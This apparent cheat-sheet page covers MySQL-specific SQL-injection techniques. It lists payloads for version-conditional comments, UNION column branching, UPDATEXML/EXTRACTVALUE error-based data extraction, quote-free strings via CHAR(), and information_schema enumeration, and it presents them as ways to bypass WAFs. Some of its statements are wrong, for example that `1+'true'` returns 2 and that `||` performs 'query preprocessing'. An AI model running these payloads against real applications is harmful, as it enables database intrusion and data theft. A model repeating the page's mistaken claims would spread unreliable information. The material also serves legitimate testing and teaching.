---
title: MySQL-specific Code
description: MySQL-specific syntax and techniques for SQL injection
category: Advanced Techniques
order: 19
tags: ["mysql specific", "special syntax", "version compatibility"]
lastUpdated: 2025-03-15
---

## MySQL-specific Code

MySQL provides several unique syntax features and functions that can be leveraged in SQL injection attacks. Understanding these MySQL-specific techniques can help bypass filters and execute complex injections.

### Version-Specific Comments

MySQL supports a special comment syntax that executes code only on specific versions:

```sql
/*!50000 SELECT * FROM users */
```

This will execute `SELECT * FROM users` only on MySQL version 5.0.0 and higher.

### Examples

```sql
-- This executes on MySQL 5.5 and later
/*!55000 SELECT user from mysql.user */

-- This executes on MySQL 5.0 and later
/*!50000 SELECT user from mysql.user */

-- Using it for version detection
SELECT /*!32302 1/0, */ 1 FROM dual
-- If MySQL < 3.23.02, returns 1
-- If MySQL >= 3.23.02, error (division by zero)
```

### Version Branching with UNION

Use version-specific comments to create payloads that work across different MySQL versions:

```sql
-- Version-conditional column count: adapts UNION columns based on MySQL version
-- MySQL >= 5.0.0: executes "1,2,3" (3 columns)
-- MySQL < 5.0.0: the /*!50000 ... */ block is treated as a comment, returns "1" (1 column)
UNION SELECT 1/*!50000,2,3*/

-- Chained version checks for multiple version thresholds
-- MySQL >= 5.0.0: returns 3 columns (1,2,3)
-- MySQL >= 4.0.0 but < 5.0.0: returns 2 columns (1,3)
-- MySQL < 4.0.0: returns 1 column (1)
UNION SELECT 1/*!50000,2*//*!40000,3*/
```

**Note on null bytes (`%00`):** In web injection contexts, URL-encoded null bytes may truncate strings at the application layer before reaching MySQL. This is application-dependent behavior, not MySQL syntax.

```sql
-- Version detection: different results based on MySQL version
-- MySQL >= 5.0.94: comment content executes, WHERE becomes "1=0 OR 1=1" (TRUE)
-- MySQL < 5.0.94: comment ignored, WHERE remains "1=0" (FALSE)
SELECT 1 FROM dual WHERE 1=0 /*!50094 OR 1=1*/
-- Result: MySQL >= 5.0.94 returns row; MySQL < 5.0.94 returns empty
```

This technique allows a single payload to adapt to different MySQL versions, useful when the exact version is unknown.

### MySQL-specific Functions

MySQL offers unique functions not available in other database systems:

| Function          | Description                                                     |
| ----------------- | --------------------------------------------------------------- |
| `UPDATEXML()`     | XML manipulation function, useful for error-based injection     |
| `EXTRACTVALUE()`  | Extract XML values, also useful for error-based injection       |
| `NAME_CONST()`    | Creates a column with a specific name                           |
| `UUID()`          | Generates a unique ID (retrieves MAC address in older versions) |
| `POLYGON()`       | Geometric function that can crash some MySQL versions           |
| `WEIGHT_STRING()` | Returns the weight string for a string                          |

### Error-based Extraction Using MySQL Functions

```sql
-- Using UPDATEXML to extract data via errors
AND UPDATEXML(1,CONCAT('~',(SELECT @@version),'~'),1)

-- Using EXTRACTVALUE to extract data via errors
AND EXTRACTVALUE(1,CONCAT('~',(SELECT database()),'~'))
```

### MySQL-specific Variables

MySQL provides system variables prefixed with `@@`:

```sql
SELECT @@version       -- Database version
SELECT @@datadir       -- Data directory
SELECT @@basedir       -- Base directory
SELECT @@socket        -- Socket file path
SELECT @@plugin_dir    -- Plugin directory
SELECT @@hostname      -- Server hostname
SELECT @@tmpdir        -- Temporary directory
```

### MySQL Type Conversions

MySQL's automatic type conversion can be exploited:

```sql
-- String to number conversion
SELECT * FROM users WHERE id = '1 OR 1=1'
-- Converts to: SELECT * FROM users WHERE id = 1

-- Boolean to integer conversion
SELECT 1+'true'  -- Returns 2
SELECT 1+'false' -- Returns 1
```

### MySQL UNION Behavior

MySQL's UNION behavior has some unique characteristics:

```sql
-- MySQL allows columns in UNION to have different data types
SELECT 'string' UNION SELECT 1;  -- Works in MySQL

-- MySQL requires all columns in GROUP_CONCAT to be convertible to string
SELECT GROUP_CONCAT(id) FROM users;
```

### MySQL CHAR Function

Use CHAR to create strings from ASCII values, useful for bypassing filters:

```sql
-- Creating the string 'root' without quotes
SELECT CHAR(114, 111, 111, 116);
```

### MySQL Special Features

Other MySQL-specific features useful in injection:

```sql
-- Query preprocessing using pipes
SELECT * FROM users WHERE id = 1 || 1=1

-- Session variables
SET @var = 'SELECT * FROM users';
PREPARE stmt FROM @var;
EXECUTE stmt;

-- MySQL specific handlers
DECLARE CONTINUE HANDLER FOR SQLSTATE '23000' SET @x = 1;
```

### MySQL Information Tables

MySQL's information_schema database provides a wealth of metadata:

```sql
-- Find all tables
SELECT table_name FROM information_schema.tables

-- Find all columns for a table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'

-- Find databases
SELECT schema_name FROM information_schema.schemata
```

### MySQL Specific Injection Techniques

```sql
-- Subquery as table
SELECT * FROM (SELECT 1)x

-- Dual table (for expressions)
SELECT 1+1 FROM dual;

-- Aliasing without AS keyword
SELECT 1 a, 2 b FROM dual;
```

### Version-specific Limitations and Features

```sql
-- GROUP_CONCAT limited to 1024 characters by default in older versions
SELECT @@group_concat_max_len;  -- Check current limit

-- JSON functions only available in MySQL 5.7+
SELECT JSON_EXTRACT('{"id": 1}', '$.id');  -- Only works in 5.7+
```

### Practical Applications

Using MySQL-specific features can help in:

- Bypassing WAFs that block standard SQL injection patterns
- Creating more precise injection payloads
- Detecting MySQL versions
- Using error-based techniques specific to MySQL
